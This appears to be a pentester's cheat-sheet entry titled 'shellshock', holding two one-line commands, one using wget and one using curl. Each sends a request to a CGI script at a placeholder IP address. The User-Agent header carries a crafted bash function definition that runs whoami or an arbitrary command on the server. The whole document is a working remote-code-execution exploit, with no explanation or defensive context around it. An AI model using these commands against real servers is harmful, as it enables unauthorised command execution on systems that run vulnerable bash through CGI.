# shellshock

wget --user-agent='() { :;}; echo; echo; /usr/bin/whoami' xxx.xxx.xxx.xxx/cgi-bin/vuln.cgi

curl -H "user-agent:() { :; }; echo; echo; /bin/bash -c '\<command\>'" http://xxx.xxx.xxx.xxx/cgi-bin/vuln.cgi
